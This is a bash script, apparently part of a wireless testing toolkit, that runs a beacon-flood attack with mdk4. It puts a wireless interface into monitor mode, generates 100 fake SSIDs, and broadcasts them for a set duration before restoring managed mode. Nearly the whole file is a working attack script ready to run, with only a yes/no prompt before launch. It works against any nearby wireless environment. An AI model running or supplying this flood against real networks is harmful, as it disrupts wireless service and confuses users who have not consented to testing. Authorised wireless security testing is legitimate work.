#!/bin/bash
#
# Utility: Beacon Flood using mdk4
#
# Description:
#   Launches a beacon flood attack to broadcast fake SSIDs using mdk4.
#   This simulates many non-existent access points, causing confusion and congestion.
#
# Requirements:
#   - mdk4 must be installed and in PATH
#   - Must be run with sudo/root privileges
#   - Wireless interface must support monitor mode
#
# Usage:
#   ./run_mdk4_beacon.sh
#
# Inputs:
#   - SSID count (number of fake networks to broadcast)
#   - Transmit interval in milliseconds
#   - Duration (in seconds) to run the attack
#
# Example:
#   ./run_mdk4_beacon.sh
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - No client or AP involvement is required

# Load helpers
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/config.sh"
source "$SCRIPT_DIR/print.sh"

# Check mdk4
if ! command -v mdk4 &> /dev/null; then
    print_fail "mdk4 not found. Please install it first."
    exit 0
fi

# Cleanup
cleanup() {
    print_blank
    print_info "Starting cleanup"
    rm -f /tmp/watt_attack_active

    # Check mode
    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$MODE" != "managed" ]]; then
        print_action "Reverting to Managed mode"
        bash "$SCRIPT_DIR/set-mode-managed.sh"
        print_success "Interface set to Managed mode"
    fi

    exit 0   
}

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$T008_INTERVAL" ]]; then
    print_warn "Required variables not defined in config.sh: INTERFACE or T008_INTERVAL"
    exit 0
fi

# Display config
echo "Mode         : T008 - Beacon Flood"
echo "Interface    : $INTERFACE"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input transmit interval
while true; do
    print_prompt "Transmit interval (ms) [default: ${T008_INTERVAL}]: "
    read -r INTERVAL_MS

    INTERVAL_MS="${INTERVAL_MS:-$T008_INTERVAL}"
    
    if [[ "$INTERVAL_MS" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATTACK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T008" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Check mode
MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
if [[ "$MODE" != "monitor" ]]; then
    print_action "Enabling Monitor mode"
    bash "$SCRIPT_DIR/set-mode-monitor.sh"
    print_success "Interface set to Monitor mode"
fi

# Check SSIDs
LOCAL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SSID_FILE="$LOCAL_DIR/$T008_SSID_FILE"

if [[ -f "$SSID_FILE" ]]; then
    print_blank
    print_info "Using existing SSID list: $T008_SSID_FILE"
else
    print_blank
    print_action "Generating SSID list: $T008_SSID_FILE"
    seq -f "SSID-%03g" 1 100 > "$SSID_FILE"
    print_success "Generated 100 SSIDs"
fi

# Run attack
print_blank
print_info "Running T008 - Beacon Flood for $DURATION seconds"
sudo timeout "$DURATION" mdk4 "$INTERFACE" b -f "$SSID_FILE" -s "$INTERVAL_MS"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0